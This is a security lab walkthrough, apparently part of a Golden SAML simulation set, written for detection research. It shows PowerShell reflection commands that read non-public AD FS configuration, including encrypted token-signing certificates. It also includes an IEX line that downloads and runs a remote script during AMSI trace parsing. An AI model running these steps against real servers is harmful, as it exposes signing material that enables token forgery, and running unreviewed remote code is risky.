# Export AD FS Configuration via .NET Reflection

By default, AD FS servers come with a [PowerShell module](https://docs.microsoft.com/en-us/powershell/module/adfs/?view=windowsserver2022-ps) to administer Active Directory Federation Services (AD FS). This PS module has a PowerShell Cmdlet [Get-AdfsProperties](https://docs.microsoft.com/en-us/powershell/module/adfs/get-adfsproperties?view=windowsserver2022-ps) that allows authorized users to get publicly accessible information such as properties associated with the AD FS service.

The [Get-AdfsProperties](https://docs.microsoft.com/en-us/powershell/module/adfs/get-adfsproperties?view=windowsserver2022-ps) PS cmdlet returns a [Type object](https://docs.microsoft.com/en-us/dotnet/api/system.type?view=net-6.0) that represents the [ServiceProperties](https://docs.microsoft.com/en-us/dotnet/api/microsoft.identityserver.management.resources.serviceproperties?view=adfs-2019) .NET class.

A threat actor could use .NET reflection to access non-public metadata of the [ServiceProperties](https://docs.microsoft.com/en-us/dotnet/api/microsoft.identityserver.management.resources.serviceproperties?view=adfs-2019) .NET class to get to sensitive information such as the AD FS configuration.

![](../../../../images/labs/GoldenSAML/exportADFSConfiguration/2021-06-01_export_adfs_configuration_reflection.jpg)

## Table of Contents

* [Preconditions](#preconditions)
* [Simulation Steps](#simulation-steps)
* [Detection](#detection)
* [Output](#output)
* [References](#references)

## Preconditions

* Integrity level: medium
* Authorization:
    * Resource: AD FS Database 
    * Identity:
        * AD FS Service Account
        * Local Administrator
* AD FS Server
    * Services:
        * Active Directory Federation Services (ADFSSRV)

## Simulation Steps

### Get AD FS Service Public Properties

On the AD FS Server, open a PowerShell console and use the [Get-AdfsProperties](https://docs.microsoft.com/en-us/powershell/module/adfs/get-adfsproperties?view=windowsserver2022-ps) PS cmdlet.

```PowerShell
$ServiceProperties = Get-ADFSProperties
$ServiceProperties
```

### Access Object Members

We can access members (properties, methods, fields, events, and so on) of the current `Type` class with the PowerShell Cmdlet [Get-Member](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-member?view=powershell-7.2).

```PowerShell
$ServiceProperties | Get-Member
```

### Access Non-Public Properties

A threat actor could use [System.Reflection.BindingFlags enums](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.bindingflags?view=net-6.0) to control binding and the way in which the search for members and types is conducted by reflection. One could use the following BindingFlags to search for non-public / private members:

```
[System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic
```

Run the following commands to get non-public properties

```PowerShell
$ServiceProperties.GetType().GetProperties([System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic) | Select-Object Name
```

### Access ServiceSettingsData Non-Public Property

Export the non-public property `ServiceSettingsData` with the following commands:

```PowerShell
$ServiceSettingsDataProperty  = $ServiceProperties.GetType().GetProperty("ServiceSettingsData", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic)
$ServiceSettingsDataPropertyValue = $ServiceSettingsDataProperty.GetValue($ServiceProperties, $null)
$ServiceSettingsDataPropertyValue
```

From here, you can access encrypted token signing certificates:

```PowerShell
$ServiceSettingsDataPropertyValue.SecurityTokenService.AdditionalSigningTokens
```

## Detection

### PowerShell AMSI Data

#### Start AMSI Collection

Run the following command before executing the reflection commands above

```
logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITraceADFSReflection.etl -ets
```

#### Stop AMSI Collection

Once you are done running the commands, you can stop the data collection

```
logman stop AMSITrace -ets
```

#### Parse ETL File

We can use the following module from [Matt Graeber - Red Canary](https://twitter.com/mattifestation)
**Disclaimer**: "Get-AMSIEvent and Send-AmsiContent are helper functions used to validate AMSI ETW events. Note: because this script contains the word AMSI, it will flag most AV engines. Add an exception on a test system accordingly in order to get this to work.".

```
IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/mgraeber-rc/1eb42d3ec9c2f677e70bb14c3b7b5c9c/raw/64c2a96ece65e61f150daaf435dfc77aa88c8784/AMSITools.psm1')
```

Parse your .etl file

```
Get-AmsiEvent -Path C:\Test\AMSITraceADFSReflection.etl
```

## Output

* AD FS Configuration Settings


## References

* https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208
* https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
* https://redcanary.com/blog/amsi/